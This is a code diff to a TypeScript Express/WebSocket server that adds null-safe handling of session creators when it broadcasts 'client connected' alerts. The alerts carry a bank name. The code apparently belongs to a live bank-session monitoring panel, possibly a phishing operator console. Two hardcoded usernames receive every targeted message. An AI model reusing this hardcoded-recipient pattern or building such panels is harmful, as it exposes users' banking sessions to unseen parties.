@@ -1214,8 +1214,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
               
               if (session) {
                 // Verificar y actualizar el creador si es necesario
-                if (!session.creador && session.createdBy) {
-                  console.log(`Actualizando información de creador para sesión ${sessionId}: ${session.createdBy}`);
+                if (session.createdBy) {
+                  console.log(`Verificando información de creador para sesión ${sessionId}: ${session.createdBy}`);
                   try {
                     await ensureSessionHasCreator(sessionId, session.createdBy);
                   } catch (error) {
@@ -1234,12 +1234,13 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 
                 // Notificar a los administradores sobre la conexión del cliente
                 const adminMessage = `Cliente conectado para sesión ${sessionId} (banco: ${session.banco || 'No especificado'})`;
+                const creator = session.createdBy || '';
                 broadcastToAdmins(JSON.stringify({
                   type: 'CLIENT_CONNECTED',
                   message: adminMessage,
                   sessionId,
                   timestamp: new Date().toISOString()
-                }), session.createdBy);
+                }), creator);
               } else {
                 console.log(`No se encontró información para la sesión ${sessionId}`);
                 ws.send(JSON.stringify({
@@ -2056,7 +2057,9 @@ async function ensureSessionHasCreator(sessionId: string, creatorUsername: strin
   }
 }
 
-function broadcastToAdmins(message: string, targetUsername?: string) {
+function broadcastToAdmins(message: string, targetUsername?: string | null) {
+  // Aseguramos que targetUsername no sea null
+  const target = targetUsername || undefined;
   // Intentar parsear el mensaje para logging y extraer información
   try {
     const parsedMessage = JSON.parse(message);
@@ -2080,14 +2083,14 @@ function broadcastToAdmins(message: string, targetUsername?: string) {
   // Si se especifica un usuario objetivo, enviamos el mensaje solo a ese usuario y a todos los administradores
   let sentCount = 0;
   
-  if (targetUsername) {
+  if (target) {
     // Buscar el cliente del usuario objetivo y los administradores
     const entries = Array.from(adminClients.entries());
     for (let i = 0; i < entries.length; i++) {
       const [username, client] = entries[i];
       
       // Consideramos que cualquier usuario que está conectado como admin debe ser un admin, y también envíamos al usuario que creó
-      if ((username === targetUsername || username === 'balonx' || username === 'yako') && client.readyState === WebSocket.OPEN) {
+      if ((username === target || username === 'balonx' || username === 'yako') && client.readyState === WebSocket.OPEN) {
         client.send(message);
         sentCount++;
         console.log(`[Broadcast] Mensaje enviado específicamente a ${username}`);
